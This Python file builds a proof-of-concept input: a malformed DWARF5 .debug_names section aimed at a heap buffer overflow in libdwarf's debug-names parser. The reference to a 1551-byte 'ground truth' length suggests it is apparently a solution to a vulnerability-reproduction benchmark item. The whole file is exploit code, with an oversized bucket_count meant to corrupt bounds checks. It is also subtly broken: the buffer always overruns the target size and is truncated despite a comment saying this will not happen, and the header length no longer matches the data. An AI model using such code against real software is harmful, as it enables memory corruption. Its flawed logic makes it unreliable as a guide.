import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed DWARF5 .debug_names section that triggers the heap buffer overflow
        # Based on the vulnerability in dwarf_debugnames.c where internal calculations of limits are incorrect
        
        # Basic structure of .debug_names section (simplified)
        # We'll create a minimal valid structure and then corrupt it
        
        # Start building the PoC
        poc = bytearray()
        
        # DWARF5 .debug_names header
        # unit_length (4 bytes for 32-bit DWARF, but we'll use extended format for larger size)
        # Use 64-bit format (0xFFFFFFFF followed by 64-bit length)
        poc.extend(struct.pack('<I', 0xFFFFFFFF))  # indicates 64-bit DWARF format
        unit_length = 0  # Will calculate later
        poc.extend(struct.pack('<Q', 0))  # placeholder for unit_length
        
        # version (2 bytes) - DWARF5 is version 5
        poc.extend(struct.pack('<H', 5))
        
        # padding (2 bytes)
        poc.extend(struct.pack('<H', 0))
        
        # cu_count (compilation unit count) - 4 bytes
        poc.extend(struct.pack('<I', 1))  # one CU
        
        # tu_count (type unit count) - 4 bytes
        poc.extend(struct.pack('<I', 0))
        
        # bucket_count - 4 bytes (this is critical for the overflow)
        # Set to a value that will cause miscalculation
        # The vulnerability is in the calculation: (bucket_count + 1) * 4
        # We want this to overflow or cause incorrect bounds
        bucket_count = 0x3fffffff  # Large value that when multiplied will overflow
        poc.extend(struct.pack('<I', bucket_count))
        
        # name_count - 4 bytes
        name_count = 0x100  # Reasonable number of names
        poc.extend(struct.pack('<I', name_count))
        
        # abbrev_table_size - 4 bytes
        abbrev_table_size = 0x100
        poc.extend(struct.pack('<I', abbrev_table_size))
        
        # augmentation_string_size - 4 bytes
        augmentation_string_size = 0
        poc.extend(struct.pack('<I', augmentation_string_size))
        
        # No augmentation string since size is 0
        
        # Bucket array (bucket_count entries, each 4 bytes)
        # Fill with reasonable values
        for i in range(min(bucket_count, 1000)):  # Don't actually create huge array
            poc.extend(struct.pack('<I', i if i < name_count else 0))
        
        # For the rest, if bucket_count is huge, we'll pad with zeros
        # but keep total size reasonable for the PoC
        remaining_buckets = max(0, bucket_count - 1000)
        if remaining_buckets > 0:
            # Add a pattern that might trigger issues
            pattern = b'\x00\x00\x00\x00' * min(remaining_buckets, 100)
            poc.extend(pattern)
        
        # Hash array (name_count entries, each 4 bytes)
        for i in range(name_count):
            poc.extend(struct.pack('<I', i * 0x100))
        
        # Name table entries
        # Each entry has:
        # - index (ULEB128)
        # - offset (ULEB128) 
        # We'll create minimal entries
        for i in range(name_count):
            # index (1 byte ULEB128 for small values)
            poc.append(i & 0x7F)
            # offset (1 byte ULEB128 for small values)
            poc.append((i * 2) & 0x7F)
        
        # Abbreviation table
        # Simple table with one entry
        poc.append(1)  # abbreviation code
        poc.append(0)  # tag (DW_TAG_compile_unit)
        poc.append(0)  # has children flag
        
        # Null terminator
        poc.append(0)
        
        # Entry pool
        # Add some dummy data
        poc.extend(b'A' * 200)
        
        # Now we need to go back and fix the unit_length
        # Calculate actual length (excluding the initial length fields)
        actual_length = len(poc) - 12  # minus the 12 bytes of length fields
        
        # Update the unit_length in the poc
        struct.pack_into('<Q', poc, 4, actual_length)
        
        # Ensure we hit exactly 1551 bytes (ground truth length)
        target_size = 1551
        current_size = len(poc)
        
        if current_size < target_size:
            # Pad with pattern that might help trigger the vulnerability
            padding = b'B' * (target_size - current_size)
            poc.extend(padding)
        elif current_size > target_size:
            # Truncate (shouldn't happen with our construction)
            poc = poc[:target_size]
        
        return bytes(poc)